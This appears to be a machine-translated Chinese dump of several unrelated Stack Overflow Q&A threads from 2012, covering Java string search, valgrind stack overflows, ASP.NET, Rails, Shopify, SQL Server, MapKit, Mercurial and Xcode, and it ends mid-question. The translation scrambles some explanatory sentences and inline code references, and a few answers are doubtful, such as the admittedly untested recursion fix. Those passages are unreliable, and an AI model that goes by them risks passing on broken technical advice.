private int lastIndexOfSupplementary(int ch, int fromIndex) {
    if (Character.isValidCodePoint(ch)) {
        final char[] value = this.value;
        char hi = Character.highSurrogate(ch);
        char lo = Character.lowSurrogate(ch);
        int i = Math.min(fromIndex, value.length - 2);
        for (; i >= 0; i--) {
            if (value[i] == hi && value[i + 1] == lo) {
                return i;
            }
        }
    }
    return -1;
} 
```

还有这个，

```
lastIndexOf(ch, value.length - 1); 
```

`value`是作为字符数组的目标字符串。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-27T15:08:22.163

首先，您应该更改为：

```
if (str == null || str.length() == 0) { 
```

因为如果`str`是NPE 可以提高`null`

在您的代码中添加一个`deep`参数，如下所示：

```
public static int lastIndexOf(char ch, String str, int deep) { 
```

并在每次递归调用时增加它的值

```
int indexInRest = lastIndexOf(ch, str.substring(1), deep++); 
```

然后，在返回语句中，将 deep 添加到返回值：

```
return 1 + indexInRest + deep; // this might not work properly 
```

第一次调用函数`deep = 0`，或者更好的是，使两个参数`lastIndexOf`的方法调用 3 参数版本`lastIndexOf`的`deep`参数设置为 0

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-27T15:09:07.717

您还可以使用`Matcher`以预测作业要求的字符串分析的演变：

```
public int getlastMatch(String searchPattern,String textString) {
       int index = -1;
       Pattern pattern = Pattern.compile(searchPattern);
       Matcher matcher = pattern.matcher(textString);

       while(matcher.find()) {
               index = matcher.start();
       }
       return index;
   } 
```

`textString`你关心的角色可能在哪里。

从而返回字符串中最后一次出现的字符串部分。

# c - 使用 valgrind memcheck 提前终止程序

> ID：12624373
> 
> 赞同：6
> 
> 时间：2012-09-27T15:01:27.437
> 
> 标签：c, gcc, gdb, valgrind

我有一个我编译的 C 程序（很多数字而且太长无法发布）

```
gcc -g -O0 program.c -o program 
```

我正在尝试使用 gdb 和 valgrind memcheck 对其进行调试。在对代码进行一些更改后，我发现

```
valgrind --tool=memcheck --log-file=output.log ./program 
```

给

```
==15866== Memcheck, a memory error detector
==15866== Copyright (C) 2002-2011, and GNU GPL'd, by Julian Seward et al.
==15866== Using Valgrind-3.7.0 and LibVEX; rerun with -h for copyright info
==15866== Command: ./program
==15866== Parent PID: 3362
==15866== 
==15866== Warning: client switching stacks?  SP change: 0xbe88bcd8 --> 0xbe4e1f70
==15866==          to suppress, use: --max-stackframe=3841384 or greater
==15866== Invalid write of size 4
==15866==    at 0x804B7BE: main (program.c:1396)
==15866==  Address 0xbe4e1f74 is on thread 1's stack
==15866== 
==15866== Invalid write of size 4
==15866==    at 0x804B7C2: main (program.c:1396)
==15866==  Address 0xbe4e1f70 is on thread 1's stack
==15866== 
==15866== Invalid read of size 4
==15866==    at 0x4320011: on_exit (on_exit.c:34)
==15866==    by 0x43064D2: (below main) (libc-start.c:226)
==15866==  Address 0xbe4e1f70 is on thread 1's stack
==15866== 
==15866== Invalid read of size 4
==15866==    at 0x4320022: on_exit (on_exit.c:37)
==15866==    by 0x43064D2: (below main) (libc-start.c:226)
==15866==  Address 0xbe4e1f74 is on thread 1's stack 
```

以及更多此类。

```
valgrind --tool=memcheck --max-stackframe=3841384 --log-file=output.log ./program 
```

不打印任何错误。但令我困惑的是，两个 valgrind 调用程序都会提前退出（没有错误消息）并且不执行它应该执行的计算。具有相同编译器选项但在没有 valgrind 的情况下运行的行为完全不同，看起来很正常。但是我怀疑是内存错误，并想使用 valgrind 来查找它。因此，我的问题是：当使用 valgrind 执行程序时，什么样的错误会使程序变得如此不同？如果这些是与内存相关的错误，我该如何识别它？请注意，我很清楚我可以“手动调试”来定位它。但是我可以用 valgrind 运行 gdb 来查看它的退出位置。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:19:48.117

我最初在评论中回答：

> 您可能会导致堆栈溢出。您是否在堆栈上分配“大”数组？例如，如果是这样，那么您应该使用and `double myArray[10000000];`将此类分配替换为堆内存。`malloc``free`

我写了一个简短的 c 程序来故意导致这样的堆栈溢出并检查 valgrind 报告的内容：

```
#include <stdio.h>

int main(){

  // imax*sizeof(double) is too big for the stack.
  int imax = 10000000;
  double test[imax];

  // I do a little math to prevent the stack overflow from being optimized away if -O3 is used.
  test[0]=0;
  test[1]=1;
  for(int i=2; i<imax; i++)
    test[i]=0.5*(test[i-1]+test[i-2]);
  printf("%e\n", test[imax-1]);

} 
```

果然，valgrind 想出了：

```
==83869== Warning: client switching stacks?  SP change: 0x104802930 --> 0xffbb7520
==83869==          to suppress, use: --max-stackframe=80000016 or greater
==83869== Invalid write of size 8
==83869==    at 0x100000ED0: main (in ./a.out)
==83869==  Address 0xffbb7520 is on thread 1's stack 
```

以及大量其他错误消息，并最终退出`Segmentation fault: 11`

# c# - Request[" "] 是什么意思？

> ID：12624374
> 
> 赞同：0
> 
> 时间：2012-09-27T15:01:29.513
> 
> 标签：c#, javascript, asp.net

我遇到了这个不寻常的东西，我不确定它是什么。

我发现代码中有一个地方：

```
if(IsPostBack == false)
{
    string strInterior = Request["xmlString"];
} 
```

我有一个使用 xml http object ajax 的 javascript 页面（该项目在*asp.net 1.1*中）

这个 xmlString 是 javascript 中的一个变量，它包含一个 XML 格式字符串并像这样传递它：

```
var objTrim = createXMLHttpObj();
var xmlString = "<UrlXML>";
xmlString += "<ID>" + id + "</ID>";
url = url + "abc.aspx?trim=";       
objTrim.open("POST", url + escape(TrimRecordsValue) , true);
objTrim.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");  

objTrim.send("xmlString=" + xmlString); 
```

我不确定这`Request["xmlString"]`意味着什么。这在页面后面的代码中被调用。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:03:23.990

该`xmlString`值正在发布到服务器，因此可以在服务器[`Request.Form`集合](http://msdn.microsoft.com/en-us/library/ms525985%28v=vs.90%29.aspx)中读取。

这`Request["string"]`是一个索引器操作符，它通过 QueryString、Form、Cookies 和 ServerVariables 集合进行搜索。

在您的情况下，它正在寻找`Form`集合中的价值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:09:00.090

It's a syntax shortcut for the [`Item`](http://msdn.microsoft.com/en-us/library/system.web.httprequest.item.aspx) property of the `HttpRequest`, which will look for an item with that string as it's key in either the `QueryString`, `Form`, `Cookies`, or `ServerVariables` collections.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-27T17:46:11.463

objTrim.send("xmlString=" + xmlString);

您正在执行 Ajax Post 以进行编码。xmlString 是一个查询字符串 id。要获取查询字符串的值，需要使用 Request["xmlString"] 或 Request.QueryString["xmlString"]

通过这种方式，我们通过 Ajax Get 或 Post 将值从客户端发送到服务器端。如果值长度足够小以适合一个网络数据包，我们可以使用“获取”。

您可以发送多个值 amso - 例如，objTrim.send("xmlString=" + xmlString + "&anothervalue=blablabla);

字符串 str_xmlstring = 请求["xmlString"]; 字符串 str_anothervalue = 请求["anothervalue"];

希望，这消除了所有的困惑。

干杯

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T15:07:56.667

Every time a form is sent to the server (every time you ***post*** something on a page), a collection of values is sent with the header in the form of `Request.Form`. So Request["something"] will get the "something" index of that collection.

# ruby-on-rails-3.1 - 使用 Heroku 上的升级应用程序让我在 css 中的图像在 Rails 和资产管道上工作

> ID：12624376
> 
> 赞同：1
> 
> 时间：2012-09-27T15:01:32.023
> 
> 标签：ruby-on-rails-3.1, asset-pipeline

这是我正在升级到 Rails 3.1 的应用程序以及资产管道。一切在开发中看起来都很好，但是当我推送到heroku时，我的css中的图像没有显示。

几个问题。首先，我应该将这些文件保留为 css 扩展名，还是应该将它们重命名为 scss 或 css.scss.erb？

我的另一个问题是我应该如何引用 css 中的图像。目前我有...

```
 background: #B4F4FF url(/assets/img01.jpg) repeat-x left top;^M 
```

我很确定我需要用“image_tag”或“asset_tag”替换 url……看起来有几个选项可用。另外，路径应该是什么？...../assets，assets/images，只是文件名？？？

我已经尝试了各种方法和路径，但无法让它在 Heroku 中工作。任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-03T16:06:11.970

哇！这是一个真正的痛苦弄清楚。

对我来说，问题集中在我的应用程序中的静态页面上。我不得不添加行...

```
 config.assets.precompile += ['static_pages.css'] 
```

到 config/environments/production.rb，然后在本地编译我的资产

```
RAILS_ENV=production bundle exec rake assets:precompile 
```

然后将所有这些推送到heroku。

# shopify - Python Shopify 图片 API

> ID：12624377
> 
> 赞同：0
> 
> 时间：2012-09-27T15:01:38.997
> 
> 标签：shopify

我正在尝试使用 Shopify 的 python API 来检索产品图像列表，但出现错误。我认为这是因为网址格式错误。有什么解决办法吗？

```
images = shopify.Image.find(product.id) 
```

错误堆栈跟踪：

```
Traceback:
File "/home/rodxavierbondoc/.virtualenvs/shopify/src/django/django/core/handlers/base.py" in get_response
  105\.                         response = middleware_method(request, callback, callback_args, callback_kwargs)
File "/home/rodxavierbondoc/.virtualenvs/shopify/local/lib/python2.7/site-packages/mezzanine/pages/middleware.py" in process_view
  45\.             return view_func(request, *view_args, **view_kwargs)
File "/home/rodxavierbondoc/.virtualenvs/shopify/src/django/django/views/generic/base.py" in view
  48\.             return self.dispatch(request, *args, **kwargs)
File "/home/rodxavierbondoc/.virtualenvs/shopify/src/django/django/utils/decorators.py" in _wrapper
  25\.             return bound_func(*args, **kwargs)
File "/home/rodxavierbondoc/.virtualenvs/shopify/src/django/django/contrib/auth/decorators.py" in _wrapped_view
  20\.                 return view_func(request, *args, **kwargs)
File "/home/rodxavierbondoc/.virtualenvs/shopify/src/django/django/utils/decorators.py" in bound_func
  21\.                 return func(self, *args2, **kwargs2)
File "/home/rodxavierbondoc/.virtualenvs/shopify/src/django/django/utils/decorators.py" in _wrapper
  25\.             return bound_func(*args, **kwargs)
File "/home/rodxavierbondoc/workspace/sg/djangoproject/shopify_app/decorators.py" in wrapper
  10\.         return func(request, *args, **kwargs)
File "/home/rodxavierbondoc/.virtualenvs/shopify/src/django/django/utils/decorators.py" in bound_func
  21\.                 return func(self, *args2, **kwargs2)
File "/home/rodxavierbondoc/workspace/sg/djangoproject/shopify_galleries/views.py" in dispatch
  93\.         return super(ListProductsView, self).dispatch(request, *args, **kwargs)
File "/home/rodxavierbondoc/.virtualenvs/shopify/src/django/django/views/generic/base.py" in dispatch
  69\.         return handler(request, *args, **kwargs)
File "/home/rodxavierbondoc/.virtualenvs/shopify/src/django/django/views/generic/list.py" in get
  114\.         self.object_list = self.get_queryset()
File "/home/rodxavierbondoc/workspace/sg/djangoproject/shopify_galleries/views.py" in get_queryset
  100\.             image = shopify.Image.find(product.id)
File "/home/rodxavierbondoc/.virtualenvs/shopify/local/lib/python2.7/site-packages/pyactiveresource/activeresource.py" in find
  349\.             return cls._find_single(id_, **kwargs)
File "/home/rodxavierbondoc/.virtualenvs/shopify/local/lib/python2.7/site-packages/pyactiveresource/activeresource.py" in _find_single
  452\.         return cls._build_object(cls.connection.get(path, cls.headers),
File "/home/rodxavierbondoc/.virtualenvs/shopify/local/lib/python2.7/site-packages/pyactiveresource/connection.py" in get
  328\.         return self.format.decode(self._open('GET', path, headers=headers).body)
File "/home/rodxavierbondoc/.virtualenvs/shopify/local/lib/python2.7/site-packages/shopify/base.py" in _open
  18\.             self.response = super(ShopifyConnection, self)._open(*args, **kwargs)
File "/home/rodxavierbondoc/.virtualenvs/shopify/local/lib/python2.7/site-packages/pyactiveresource/connection.py" in _open
  287\.                 http_response = self._handle_error(err)
File "/home/rodxavierbondoc/.virtualenvs/shopify/local/lib/python2.7/site-packages/pyactiveresource/connection.py" in _handle_error
  407\.             raise ResourceNotFound(err)

Exception Type: ResourceNotFound at /galleries/1/products/
Exception Value: Not Found: https://sawayn-and-sons9677.myshopify.com/admin/products//images/103786527.xml 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T15:52:40.210

`product_id`Product Images API 中的 是一个前缀[选项](http://wiki.shopify.com/Using_the_shopify_python_api#Prefix_Options)，它是使用关键字参数指定的。

`images = shopify.Image.find(product_id=product.id)`

# sql - SQL Server：加入和追加列

> ID：12624382
> 
> 赞同：1
> 
> 时间：2012-09-27T15:02:03.460
> 
> 标签：sql, sql-server, database, sql-server-2008, tsql

我有一个 SQL 问题，希望有人可以帮助我或给我一些指示。非常感激。

我有两张桌子：A 和 B。

*   A 具有`ID`作为主键字段的列，并且`NAME`
*   B 有列，`DUPID`这是主键`NAME``ID`

A 和 B 之间的关系在 B 中，`DUPID`包含 的某些值`A.ID`，请求是在 join 的基础上附加不同的`B.NAME`值，`A.NAME`用分号分隔`A.ID = B.DUPID`。

可能我的解释不清楚，这里举个简单的例子。

```
A                                  B
ID  NAME                           DUPID      NAME
1   null                            1             John
2   null                            1             John
3   null                            1             Mark
4   null                            3             Luke
5   null                            3             Luke
                                    3             Luke
                                    3             Matthew 
```

所以最终，我需要更新表 A，让它看起来像下面

```
A
ID      NAME
1        John;Mark
2        null
3        Luke;Matthew
4        null
5        null 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T15:04:59.730

与, 不同`MySQL`，`SQL Server`没有内置函数可以做到这一点。但是您仍然可以使用`CROSS APPLY`and来模拟它`FOR XML PATH('')`

```
SELECT  a.ID, 
        SUBSTRING(d.NameList,1, LEN(d.NameList) - 1) Names
FROM    a
        CROSS APPLY
        (
            SELECT DISTINCT [NAME] + '; ' 
            FROM  B 
            WHERE A.ID = B.DupID 
            FOR XML PATH('')
        ) D (NameList) 
```

# [SQLFiddle 演示](http://sqlfiddle.com/#!3/85cd8/4)

# ios - MapKit 帮助。无法先显示我的位置

> ID：12624384
> 
> 赞同：0
> 
> 时间：2012-09-27T15:02:05.020
> 
> 标签：ios, geolocation, mapkit, cllocationmanager

我想开发一张地图，显示我的位置并在地图上显示其他位置的图钉。

我已经显示了地图，也显示了图钉，它也可以找到我，但它不会先放大我的位置。我怎样才能让它首先显示我的位置？当我打开地图视图时，它只显示我输入代码的最后一个引脚。这是我的代码。

地图视图.h

```
#import <UIKit/UIKit.h>
#import <MapKit/MapKit.h>

@interface mapview : UIViewController {

    MKMapView *mapview1;

}

@property (nonatomic, retain) IBOutletMKMapView *mapview1;

-(IBAction)setMap:(id)sender;

-(IBAction)getlocation;

@end 
```

地图视图.m

```
#import "mapview.h"
#import "NewClass.h"

@implementation mapview

@synthesize mapview1;

-(IBAction)getlocation {

    mapview1.showsUserLocation = YES;

}

-(IBAction)setMap:(id)sender {
    switch (((UISegmentedControl *) sender).selectedSegmentIndex) {
        case 0:
            mapview1.mapType = MKMapTypeStandard;
            break;
        case 1:
            mapview1.mapType = MKMapTypeSatellite;
            break;
        case 2:
            mapview1.mapType = MKMapTypeHybrid;
            break;
        default:
            break;
    }

}

-(void)viewDidLoad {

    [super viewDidLoad];

        [mapview1 setMapType:MKMapTypeStandard];
        [mapview1 setZoomEnabled:YES];
        [mapview1 setScrollEnabled:YES];

        MKCoordinateRegion region = { {0.0, 0.0 }, {0.0, 0.0 } };
        region.center.latitude = 39.956907;
        region.center.longitude = -75.610229;
        region.span.longitudeDelta = 0.01f;
        region.span.latitudeDelta = 0.01f;
        [mapview1 setRegion:region animated:YES];

        NewClass *ann = [[NewClass alloc] init];
        ann.title = @"Vigil Location";
        ann.subtitle = @"Planned Parenthood of Chester County";
        ann.coordinate = region.center;
        [mapview1 addAnnotation:ann];

    MKCoordinateRegion region1 = { {0.0, 0.0 }, {0.0, 0.0 } };
    region1.center.latitude = 40.042819;
    region1.center.longitude = -75.373776;
    region1.span.longitudeDelta = 0.01f;
    region1.span.latitudeDelta = 0.01f;
    [mapview1 setRegion:region1 animated:YES];

    NewClass *ann1 = [[NewClass alloc] init];
    ann1.title = @"Vigil Location";
    ann1.subtitle = @"Planned Parenthood of Bryn Mawr";
    ann1.coordinate = region1.center;
    [mapview1 addAnnotation:ann1];

    MKCoordinateRegion region2 = { {0.0, 0.0 }, {0.0, 0.0 } };
    region2.center.latitude = 40.18295;
    region2.center.longitude = -75.450163;
    region2.span.longitudeDelta = 0.01f;
    region2.span.latitudeDelta = 0.01f;
    [mapview1 setRegion:region2 animated:YES];

    NewClass *ann2 = [[NewClass alloc] init];
    ann2.title = @"Vigil Location";
    ann2.subtitle = @"Planned Parenthood Collegeville";
    ann2.coordinate = region2.center;
    [mapview1 addAnnotation:ann2];

    MKCoordinateRegion region3 = { {0.0, 0.0 }, {0.0, 0.0 } };
    region3.center.latitude = 40.120772;
    region3.center.longitude = -75.118181;
    region3.span.longitudeDelta = 0.01f;
    region3.span.latitudeDelta = 0.01f;
    [mapview1 setRegion:region3 animated:YES];

    NewClass *ann3 = [[NewClass alloc] init];
    ann3.title = @"Vigil Location";
    ann3.subtitle = @"Abington Memorial Hospital";
    ann3.coordinate = region3.center;
    [mapview1 addAnnotation:ann3];

    MKCoordinateRegion region4 = { {0.0, 0.0 }, {0.0, 0.0 } };
    region4.center.latitude = 39.95361;
    region4.center.longitude = -75.15267;
    region4.span.longitudeDelta = 0.01f;
    region4.span.latitudeDelta = 0.01f;
    [mapview1 setRegion:region4 animated:YES];

    NewClass *ann4 = [[NewClass alloc] init];
    ann4.title = @"Vigil Location";
    ann4.subtitle = @"Philadelphia Women's Center";
    ann4.coordinate = region4.center;
    [mapview1 addAnnotation:ann4];

    MKCoordinateRegion region5 = { {0.0, 0.0 }, {0.0, 0.0 } };
    region5.center.latitude = 39.910566;
    region5.center.longitude = -75.014111;
    region5.span.longitudeDelta = 0.01f;
    region5.span.latitudeDelta = 0.01f;
    [mapview1 setRegion:region5 animated:YES];

    NewClass *ann5 = [[NewClass alloc] init];
    ann5.title = @"Vigil Location";
    ann5.subtitle = @"Cherry Hill Women's Center";
    ann5.coordinate = region5.center;
    [mapview1 addAnnotation:ann5];

    MKCoordinateRegion region6 = { {0.0, 0.0 }, {0.0, 0.0 } };
    region6.center.latitude = 39.74285;
    region6.center.longitude = -75.550838;
    region6.span.longitudeDelta = 0.01f;
    region6.span.latitudeDelta = 0.01f;
    [mapview1 setRegion:region6 animated:YES];

    NewClass *ann6 = [[NewClass alloc] init];
    ann6.title = @"Vigil Location";
    ann6.subtitle = @"Planned Parenthood of Wilmington";
    ann6.coordinate = region6.center;
    [mapview1 addAnnotation:ann6];

    MKCoordinateRegion region7 = { {0.0, 0.0 }, {0.0, 0.0 } };
    region7.center.latitude = 40.03754;
    region7.center.longitude = -76.300828;
    region7.span.longitudeDelta = 0.01f;
    region7.span.latitudeDelta = 0.01f;
    [mapview1 setRegion:region7 animated:YES];

    NewClass *ann7 = [[NewClass alloc] init];
    ann7.title = @"Vigil Location";
    ann7.subtitle = @"Planned Parenthood of Lancaster";
    ann7.coordinate = region7.center;
    [mapview1 addAnnotation:ann7];

    MKCoordinateRegion region8 = { {0.0, 0.0 }, {0.0, 0.0 } };
    region8.center.latitude = 40.333819;
    region8.center.longitude = -75.93019;
    region8.span.longitudeDelta = 0.01f;
    region8.span.latitudeDelta = 0.01f;
    [mapview1 setRegion:region8 animated:YES];

    NewClass *ann8 = [[NewClass alloc] init];
    ann8.title = @"Vigil Location";
    ann8.subtitle = @"Planned Parenthood of Reading";
    ann8.coordinate = region8.center;
    [mapview1 addAnnotation:ann8];

    MKCoordinateRegion region9 = { {0.0, 0.0 }, {0.0, 0.0 } };
    region9.center.latitude = 40.67246;
    region9.center.longitude = -75.375397;
    region9.span.longitudeDelta = 0.01f;
    region9.span.latitudeDelta = 0.01f;
    [mapview1 setRegion:region9 animated:YES];

    NewClass *ann9 = [[NewClass alloc] init];
    ann9.title = @"Vigil Location";
    ann9.subtitle = @"Planned Parenthood of Allentown";
    ann9.coordinate = region9.center;
    [mapview1 addAnnotation:ann9];

    MKCoordinateRegion region10 = { {0.0, 0.0 }, {0.0, 0.0 } };
    region10.center.latitude = 39.952384;
    region10.center.longitude = -76.7253;
    region10.span.longitudeDelta = 0.01f;
    region10.span.latitudeDelta = 0.01f;
    [mapview1 setRegion:region10 animated:YES];

    NewClass *ann10 = [[NewClass alloc] init];
    ann10.title = @"Vigil Location";
    ann10.subtitle = @"Planned Parenthood of York";
    ann10.coordinate = region10.center;
    [mapview1 addAnnotation:ann10];
}

- (void)didReceiveMemoryWarning {
    // Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];

    // Release any cached data, images, etc that aren't in use.
}

- (void)viewDidUnload {
    // Release any retained subviews of the main view.
    // e.g. self.myOutlet = nil;
}

- (void)dealloc {
    [super dealloc];
}

@end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T04:30:11.787

您已经设置了 showsUserLocation 但如果您阅读 Apple 文档，您会看到该功能仅打开蓝点，它不会缩放或平移视图。“http://developer.apple.com/library/ios/documentation/MapKit/Reference/MKMapView_Class/MKMapView/MKMapView.html#//apple_ref/occ/instp/MKMapView/showsUserLocation

您要做的是将用户跟踪模式设置为 userfollows。

其他代码提示：

*   将所有这些地方放在一个数组中并循环它们，不要像那样一次创建一个
*   不要在地图上为您创建的每个区域设置区域。您正在尝试让地图放大用户，并且每个 setRegion 都会更改地图的查看位置。无论如何，只有最后一个会有任何影响。
*   您不需要创建一个区域来获取注释的坐标

# windows-7 - Mercurial 在 Windows XP 中显示文件修改不正确，但在 Windows 7 中没有

> ID：12624385
> 
> 赞同：1
> 
> 时间：2012-09-27T15:02:05.987
> 
> 标签：windows-7, mercurial, windows-xp, tortoisehg

我正在使用 Tortoise 2.4.2 并且有一个奇怪的问题：

*   在 Windows 7 上，从服务器克隆存储库 X 时一切正常
*   在 XP 上从服务器克隆存储库 X 时，我修改了一些文件，尽管它们没有被修改

**重要提示：**我试过[这个](https://stackoverflow.com/questions/3038734/how-to-revert-unchanged-files-with-mercurial)，[这个](https://stackoverflow.com/questions/6464824/mercurial-marks-unmodified-files-as-modified-in-working-directory-and-fails-to-r)和[这个](https://stackoverflow.com/questions/8540228/diffing-a-file-against-last-mercurial-changeset-should-it-be-different)没有成功。

在 XP 上，当我尝试做差异时，我没有得到任何区别（二进制相等）。

有人遇到过这个问题吗？有解决办法吗？

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T07:46:54.840

**mercurial.ini**文件似乎包含一些不需要的选项。它已经激活了**eol**扩展，但在 [eol] 部分有一个额外的选项在 Windows XP 上创建了不需要的行为（这在 Windows 7 上不存在）。

希望这可以在将来节省一些神经元。

```
[eol]
;only-consistent = False
; the previous line should be commented and the repository re-cloned 
```

# javascript - 如何将数据传递给 AsyncFileUpload（客户端）事件？

> ID：12624386
> 
> 赞同：0
> 
> 时间：2012-09-27T15:02:05.750
> 
> 标签：javascript, asp.net, dom-events, ajaxcontroltoolkit, asyncfileupload

我正在创建一个 ASP.NET 网站，并且正在使用 AJAX 控件工具包“AsyncFileUpload”控件，我只想将一个值传递给`onclientuploadcomplete`客户端事件，并且我想在从`UploadedComplete`服务器事件中保存文件后执行此操作。

这是我目前的`AsyncFileUpload`：

```
 <asp:AsyncFileUpload ID="AsyncFileUpload2" runat="server" CssClass="fileupload" onclientuploadstarted="uploadStarted" 
                                UploadingBackColor="#CCFFFF" Width="221px" 
                                onclientuploaderror="upload_error" ClientIDMode="AutoID" 
                                onclientuploadcomplete="done_uploading" /> 
```

她是我当前的 Javascript 代码：

```
</script>

<script language="javascript" type="text/javascript">

   var baseUrl = "<%= ResolveUrl("~/") %>";

    function done_uploading(THE_VALUE) {
         //TODO: ALERT THE_VALUE
    }

    function uploadStarted(sender, args) {

        var file = args.get_fileName();

        var extensions = "7z";

        if (!new RegExp("(" + extensions + ")$").test(file)) {
            throw (new Error());
        } else {
           // show_loading();
        }
    }

    function upload_error() {

    }

</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:29:38.127

您可以尝试使用此代码 - 只需将您的委托替换为

```
function upload_error (sender, args)
{
   //Print : args.get_fileName() 

   //Print also :args.get_errorMessage()

   document.getElementById('JustSampleForPrint').innerText = args.get_errorMessage();
} 
```

注意：添加此元素 JustSampleForPrint，以便在里面打印。

# asp.net-mvc - 在 ASP.NET MVC4 中的自定义移动显示模式和桌面模式之间切换

> ID：12624387
> 
> 赞同：2
> 
> 时间：2012-09-27T15:02:06.807
> 
> 标签：asp.net-mvc, mobile

我想创建一个切换到完整站点链接并切换到移动链接。我不想通过使用会话变量来强迫它去任何一个。我想知道是否可以使用 ViewSwitcher Controller 自动完成。

这是我用于自定义移动显示模式的内容

```
 public class MobileDisplayMode : DefaultDisplayMode
{
        public static readonly List<string> MobileList = new List<string>
    {
        "Android",
        "Mobile",
        "Opera Mobi",
        "Samsung",
        "HTC",
        "Nokia",
        "Ericsson",
        "SonyEricsson",
        "iPhone"
        ,"ipod"
        , "symbian"
         ,"android"
                        ,"windows ce"
                        ,"blackberry"
                        ,"palm"
                        ,"opera mini"
    };

    public MobileDisplayMode()
        : base("Mobile")
    {
        ContextCondition = (context => IsMobile(context, context.GetOverriddenUserAgent()));
    }

    private bool IsMobile(HttpContextBase context, string useragentString)
    {
        return context.Request.Browser.IsMobileDevice || MobileList.Any(val => useragentString.IndexOf(val, StringComparison.InvariantCultureIgnoreCase) >= 0);
    }
} 
```

这是我的视图切换器代码 - 不要担心 IsMobile 属性，它的处理方式与移动显示模式相同

```
 if (IsMobile == mobile)
        {
            HttpContext.ClearOverriddenBrowser();
        }
        else
        {
            HttpContext.SetOverriddenBrowser(mobile ? BrowserOverride.Mobile :                         BrowserOverride.Desktop);
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T21:12:15.297

将 Jquery.Mobile.Mvc 包添加到项目中。将创建一个移动布局。现在每个移动视图都会显示一个指向桌面版本的链接。将下面的代码放在桌面视图中，以便用户可以返回到移动端。

```
@Html.ActionLink("Mobile view", "SwitchView", "ViewSwitcher", new { mobile = true, returnUrl = Request.Url.PathAndQuery }, new { rel = "external" }) 
```

# xcode - Xcode 4.5（Mountain Lion）中的标签切换非常慢

> ID：12624391
> 
> 赞同：52
> 
> 时间：2012-09-27T15:02:24.163
> 
> 标签：xcode, macos, xcode4.5

我最近将我的 MacBook Pro（2.3 GHz Intel Core i5）从 Lion 升级到了 Mountain Lion，同时将 Xcode 升级到了最新的 4.5 版本。我遇到了一个非常恼人的问题。在编程时，我习惯于一次打开几个选项卡。自从我更新后，每次切换选项卡时，Xcode 都会冻结一段时间（几秒钟）。有没有人有解决这个问题的建议？

我遵循[了](https://stackoverflow.com/questions/6355667/xcode-4-slow-performance)删除 project.xcworkspace 以提高性能的提示。这似乎有帮助，但只持续很短的时间。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-06T00:02:13.497

这是一个常见问题，已在 XCode 4.5.1 中修复。

[https://devforums.apple.com/thread/167765?tstart=0](https://devforums.apple.com/thread/167765?tstart=0)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-02T08:57:47.953

如果您有多个分区（可能保留了 Lion 的备份），请确保 xcode 确实来自 Mountain Lion 分区。

Xcode 的 App Store 应用更新似乎采用了它找到的第一个 Xcode.app，并将对该版本应用任何更新。就我而言，它更新了（非活动的）Lion 分区，即便如此我还是从 ML 分区启动。 `xcode-select`当我尝试将其更改为 ML 版本时没有抱怨。

所以我最终做了很棒的家务：

*   做一个`chmod 000 /Volume/<old Lion partition>/Applications/Xcode.app`
*   在 Xcode.app 上安装了一个新副本到`/Applications`
*   验证停靠图标的目的地（必须指向 ML Xcode.app）

我的 Xcode 现在和以前一样快，而且仍然很快。[您可以从https://developer.apple.com/downloads/index.action](https://developer.apple.com/downloads/index.action)获取 Xcode dmg 和命令行工具。我认为二进制文件没有区别，但是使用 DMG，我可以***看到***我删除 Xcode.app 的位置。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-14T10:18:55.067

在发现部分解决方案之前，我发现了您的问题。

到今天为止，我觉得 XCode 4.6.1 GUI 狗对我的口味来说很慢，特别是考虑到我在一个使用一年的 Mac、SSD 上运行，编译到 2GB RAM 磁盘并且还剩下 6GB RAM。与 XCode 相比，即使 Eclipse 也能以闪电般的速度运行

4.5.1 确实改进了一些东西，但是在使用 XCode 很长一段时间后，我对它的一些问题没有任何希望得到解决。

话虽如此，我注意到“实时问题”、主工具栏和所有面板都会减慢标签切换到相同程度。迄今为止，最大的违规者是导航面板。

一旦我习惯了一个简约的 Xcode 窗口，布局一些特定的任务选项卡，为 xibs 保留一个单独的窗口并学习启用/禁用面板的快捷方式，我不再受 XCode 响应性的影响，但仍然存在一些滞后可以明显感觉到。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-10-03T12:38:47.033

检查 ViewWillDisappear 上是否没有繁重的编码。此外，如果您有 NSURLConnection 或任何其他有委托方法，则在切换选项卡时不应调用。

# c# - ValidationEventHandler 没有调用

> ID：12624396
> 
> 赞同：0
> 
> 时间：2012-09-27T15:02:34.140
> 
> 标签：c#, xml-validation

我是 c# 新手，我需要编写一个应用程序来验证 Xml 文件。应用程序运行没有错误。但 Xml 无效这是代码：

```
public class Program
{
    /// <summary>
    /// Bool für Valid false or true.
    /// </summary>
    private static bool isValid;

    /// <summary>
    /// Validiert eine Xml Datei gegen ein XmlSchema
    /// </summary>
    /// <param name="args">Args StringArray</param>
    private static void Main(string[] args)
    {
        // Strings der Dateien:
        const string xmlfile = @"C:\\temp\dataneu.xml";
        const string xsdfile = @"C:\\temp\xsd\OlShopSchnittstelle.xsd";

        // Reader settings öffnen, Schema hinzufügen + ValidationType setzen.
        XmlReaderSettings settings = new XmlReaderSettings();
        settings.Schemas.Add("http://tempuri.org/OLShopSchnittstelle.xsd", xsdfile);
        settings.ValidationType = ValidationType.Schema;

        // XmlDoc, settings zum neuen XmlReader hinzufügen.
        XmlReader reader = XmlReader.Create(xmlfile, settings);

